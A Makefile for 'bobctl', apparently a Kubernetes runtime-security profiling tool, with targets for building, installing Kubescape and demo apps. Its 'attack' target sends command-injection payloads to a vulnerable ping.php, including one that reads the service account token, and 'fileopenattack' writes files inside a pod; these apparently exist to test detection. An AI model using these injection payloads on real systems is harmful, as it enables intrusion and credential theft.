NAME := bobctl
VERSION ?= 0.1.0
BUILD_DIR := bin

GO ?= go
GO_VERSION ?= 1.24
KUBESCAPE_CHART_VER ?= 1.30.2
GHCR_ORG ?= k8sstormcenter
STORAGE_TAG ?=
NODEAGENT_TAG ?=

OUTPUT_PATH := $(BUILD_DIR)/$(OS)/$(ARCH)/$(NAME)
HELM = $(shell which helm)

#CURRENT_CONTEXT := $(shell kubectl config current-context)
OS := $(shell uname -s | tr '[:upper:]' '[:lower:]')
ARCH := $(shell uname -m | sed 's/x86_64/amd64/')

GO_LDFLAGS := -s -w -X main.version=$(VERSION)
REPO_ROOT := $(shell git rev-parse --show-toplevel)
WEBAPP_POD := $(shell kubectl get pods --namespace webapp -l "app.kubernetes.io/name=mywebapp,app.kubernetes.io/instance=webapp" -o jsonpath="{.items[0].metadata.name}")



.PHONY: all
all: build

.PHONY: build
build: $(OUTPUT_PATH)

$(OUTPUT_PATH): $(GO_FILES)
	@echo "Building $(NAME) for $(OS)/$(ARCH)..."
	@mkdir -p $(dir $(OUTPUT_PATH))
	CGO_ENABLED=0 $(GO) build -trimpath -ldflags="$(GO_LDFLAGS)" -o $(OUTPUT_PATH) ./src/main.go
	@echo "Build complete: $(OUTPUT_PATH)"

.PHONY: clean
clean:
	@echo "Cleaning build artifacts..."
	@rm -rf $(BUILD_DIR)
	@echo "Clean complete."

.PHONY: docker-build
docker-build:
	@echo "Running docker build $(NAME)..."
	docker buildx build --platform linux/amd64,linux/arm64 -t ghcr.io/k8sstormcenter/$(NAME):latest -f Dockerfile .

.PHONY: run
run: build
	@echo "Running $(NAME)..."
	@$(OUTPUT_PATH)

.PHONY: mac-prep
mac-prep:
	docker buildx create --name mybuilder --driver docker-container --use

.PHONY: tetragon
tetragon:
	-$(HELM) repo add cilium https://helm.cilium.io
	-$(HELM) repo update
	-$(HELM) upgrade --install tetragon cilium/tetragon -n bob --create-namespace --values honeycluster/honeystack/tetragon/values.yaml
	-kubectl wait --for=condition=Ready pod -l app.kubernetes.io/name=tetragon -n bob --timeout=5m 

.PHONY: helm-install-no-bob
helm-install-no-bob: 
	@echo "Installing webapp without BoB configuration..."
	helm pull oci://ghcr.io/k8sstormcenter/mywebapp 
	helm upgrade --install webapp oci://ghcr.io/k8sstormcenter/mywebapp --version 0.1.0 --namespace webapp --create-namespace --set bob.create=false
	rm -rf mywebapp-0.1.0.tgz
	-kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=mywebapp -n webapp

.PHONY: helm-install
helm-install: kubescape 
	@echo "Installing webapp with BoB configuration ..."
	#helm pull oci://ghcr.io/k8sstormcenter/mywebapp
	#helm upgrade --install webapp oci://ghcr.io/k8sstormcenter/mywebapp --version 0.1.0 --namespace webapp --create-namespace --set bob.create=true --set bob.ignore=false
	#rm -rf mywebapp-0.1.0.tgz
	helm upgrade --install webapp example/mywebapp-chart --namespace webapp --create-namespace --values example/mywebapp-chart/values.yaml
	-kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=mywebapp -n webapp


.PHONY: helm-redis
helm-redis: 
	@echo "Installing redis..."
	helm dependency update example/myredis-umbrella-chart/redis-bob/
	helm upgrade --install bob -n bob --create-namespace ./example/myredis-umbrella-chart/redis-bob --values ./example/myredis-umbrella-chart/redis-bob/values.yaml
	-kubectl wait --for=condition=ready pod -n bob -l app.kubernetes.io/instance=bob


.PHONY: helm-redis-compromise #TODO this is a bit whimsical , come up with something better
helm-redis-compromise: 	
	@echo "Installing a compromised redis with original bob"
	#kubectl delete -n bob applicationprofile statefulset-bob-redis-master-$$(kubectl get statefulset -n bob -o jsonpath='{.items[0].status.currentRevision}'|cut -f4 -d '-')
	helm upgrade --install bob -n bob --create-namespace ./example/myredis-umbrella-chart/redis-bob --values ./example/myredis-umbrella-chart/redis-bob/values_compromised.yaml
	-kubectl wait --for=condition=ready pod -n bob -l app.kubernetes.io/instance=bob


.PHONY: helm-redis-test
helm-redis-test:
	-helm test bob -n bob

.PHONY: helm-test
helm-test:
	kubectl wait --for=condition=available --timeout=120s deployment/webapp-mywebapp -n webapp
	@echo "Deployment is ready. Running Helm tests..."
	helm test webapp -n webapp

.PHONY: helm-uninstall
helm-uninstall:
	helm uninstall webapp -n webapp

.PHONY: fwd 
fwd:
	-sudo kill -9 $$(sudo lsof -t -i :8080)
	kubectl --namespace webapp port-forward $$(kubectl get pods --namespace webapp -l "app.kubernetes.io/name=mywebapp,app.kubernetes.io/instance=webapp" -o jsonpath="{.items[0].metadata.name}") 8080:80 &

.PHONY: fileopenattack
fileopenattack:
	kubectl exec -n webapp $(WEBAPP_POD) -- cat /etc/apache2/apache2.conf
	kubectl exec -n webapp $(WEBAPP_POD) -- touch /tmp/pwned
	kubectl exec -n webapp $(WEBAPP_POD) -- echo hi > /tmp/pwned
	kubectl exec -n webapp $(WEBAPP_POD) -- cat /tmp/pwned
	kubectl exec -n webapp $(WEBAPP_POD) -- rm /tmp/pwned




.PHONY: attack # this is only for the webapp
attack:
	curl 127.0.0.1:8080/ping.php?ip=1.1.1.1\;ls
	curl  127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20/proc/self/mounts
	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20index.html"
	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcurl%20github.com"
	curl "127.0.0.1:8080/ping.php?ip=1.1.1.1%3Bcat%20/run/secrets/kubernetes.io/serviceaccount/token"
	sleep 10

.PHONY: kubescape-orig
kubescape-orig:
	-$(HELM) repo add kubescape https://kubescape.github.io/helm-charts/
	-$(HELM) repo update
	-$(HELM) upgrade --install kubescape kubescape/kubescape-operator --version $(KUBESCAPE_CHART_VER)  -n honey --create-namespace --values kubescape/values_orig.yaml
	-kubectl apply  -f kubescape/default-rules.yaml
	sleep 5
	-kubectl rollout restart -n honey ds node-agent


.PHONY: kubescape
kubescape:
	@if [ -z "$(STORAGE_TAG)" ]; then \
		echo "Auto-detecting newest storage tag from ghcr.io/$(GHCR_ORG) ..."; \
		STORAGE_TAG=$$(./scripts/fetch-newest-tag.sh $(GHCR_ORG)/storage); \
	else \
		STORAGE_TAG="$(STORAGE_TAG)"; \
	fi && \
	if [ -z "$(NODEAGENT_TAG)" ]; then \
		echo "Auto-detecting newest node-agent tag from ghcr.io/$(GHCR_ORG) ..."; \
		NODEAGENT_TAG=$$(./scripts/fetch-newest-tag.sh $(GHCR_ORG)/node-agent); \
	else \
		NODEAGENT_TAG="$(NODEAGENT_TAG)"; \
	fi && \
	echo "Using storage:$${STORAGE_TAG}  node-agent:$${NODEAGENT_TAG}" && \
	$(HELM) repo add kubescape https://kubescape.github.io/helm-charts/ || true && \
	$(HELM) repo update && \
	$(HELM) upgrade --install kubescape kubescape/kubescape-operator \
		--version $(KUBESCAPE_CHART_VER) -n honey --create-namespace \
		--values kubescape/values.yaml \
		--set storage.image.repository=ghcr.io/$(GHCR_ORG)/storage \
		--set storage.image.tag=$${STORAGE_TAG} \
		--set nodeAgent.image.repository=ghcr.io/$(GHCR_ORG)/node-agent \
		--set nodeAgent.image.tag=$${NODEAGENT_TAG} && \
	kubectl apply -f kubescape/default-rules.yaml && \
	sleep 5 && \
	kubectl rollout restart -n honey ds node-agent && \
	kubectl wait --for=condition=ready pod -l app=kubevuln -n honey --timeout 120s && \
	kubectl wait --for=condition=ready pod -l app=node-agent -n honey --timeout 120s

.PHONY: kubescape-vendor
kubescape-vendor: 
	-$(HELM) repo add kubescape https://kubescape.github.io/helm-charts/
	-$(HELM) repo update
	$(HELM) upgrade --install kubescape kubescape/kubescape-operator --version $(KUBESCAPE_CHART_VER) -n honey --create-namespace --values kubescape/values_vendor.yaml
	-kubectl apply  -f kubescape/runtimerules.yaml
	sleep 5
	-kubectl rollout restart -n honey ds node-agent
	-kubectl wait --for=condition=ready pod -l app=kubevuln  -n honey --timeout 120s
	-kubectl wait --for=condition=ready pod -l app=node-agent  -n honey --timeout 120s



.PHONY: wipe
wipe:
	-sudo kill -9 $$(sudo lsof -t -i :8080)
	-$(HELM) uninstall -n honey kubescape
	-$(HELM) uninstall -n webapp webapp
	-$(HELM) uninstall -n bob bob
	-kubectl delete namespace bob 
	-$(HELM) uninstall webapp -n webapp

.PHONY: helm
helm: ## Download helm if required
	curl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 \
		&& chmod +x get_helm.sh &&./get_helm.sh
HELM = $(shell which helm)


.PHONY: template
template:
	go run src/main.go --input testdata/parameterstudy/oneagent/operatorbobk8somni61.yaml --config src/config.yaml --input-format kubescape --output-format kubescape --input-kernel 6.1.0 --output-kernel 5.15.0 --output myoneagent/bob-dyna-operator.yaml

.PHONY: compare-bobs
compare-bobs:
	@echo "Comparing BoBs in $(BOB_DIR1) and $(BOB_DIR2)..."
	@./testdata/compare.sh $(BOB_DIR1) $(BOB_DIR2)


.PHONY: superset-bob
superset-bob:
	@echo "Creating superset BoB from $(INPUT_DIR) "
	$(REPO_ROOT)/testdata/superset.sh $(INPUT_DIR)


.PHONY: super-perl
super-perl:
	@echo "Creating superset BoB from $(INPUT_DIR) into $(OUTPUT_FILE)..."
	@perl src/generalize.pl $(INPUT_DIR) $(OUTPUT_FILE)


.PHONY: sample-app
sample-app:
	$(MAKE) --makefile=example/myharbor/Makefile install-helm install-harbor
	@kubectl wait --for=condition=ready pod -l app=harbor -n harbor --timeout=600s

.PHONY: sample-app-bob
sample-app-bob: 	
	$(MAKE) --makefile=example/myharbor/Makefile install-helm install-harbor-bob
	./src/bashhelpers/bobapply.sh all-bobs harbor
	@kubectl wait --for=condition=ready pod -l app=harbor -n harbor --timeout=600s

.PHONY: nothing
nothing:
# for when we know the hash upfront:
#helm upgrade --install bob -n bob --create-namespace --set bob.create=true ./myredis-umbrella-chart/redis-bob
	#helm upgrade --install bob -n bob --create-namespace ./myredis-umbrella-chart/redis-bob --values ./myredis-umbrella-chart/redis-bob/values.yaml
	#kubectl annotate applicationprofile statefulset-bob-redis-master-668c4559b4  -n bob meta.helm.sh/release-name- 
	#kubectl annotate applicationprofile statefulset-bob-redis-master-668c4559b4  -n bob meta.helm.sh/release-namespace-
	#kubectl annotate --overwrite applicationprofile statefulset-bob-redis-master-668c4559b4  -n bob kubescape.io/status='completed'
    #helm repo update 
	#helm upgrade --install bob -n bob --create-namespace --set bob.create=false --set bob.ignore=true ./myredis-umbrella-chart/redis-bob
	#helm upgrade --install bob -n bob --create-namespace --set bob.create=true --set bob.ignore=false --set bob.templateHash=$$(kubectl get statefulset -n bob -o jsonpath='{.items[0].status.currentRevision}'|cut -f4 -d '-') ./myredis-umbrella-chart/redis-bob
	#helm dependency update myredis-umbrella-chart/redis-bob/
	#helm upgrade --install bob -n bob --create-namespace --set bob.create=false --set bob.ignore=true ./myredis-umbrella-chart/redis-bob --values ./myredis-umbrella-chart/redis-bob/values_compromised.yaml
	#helm upgrade --install bob -n bob --create-namespace --set bob.create=true --set bob.ignore=false  --set bob.templateHash=$$(kubectl get statefulset -n bob -o jsonpath='{.items[0].status.currentRevision}'|cut -f4 -d '-')  ./myredis-umbrella-chart/redis-bob --values ./myredis-umbrella-chart/redis-bob/values_compromised.yaml
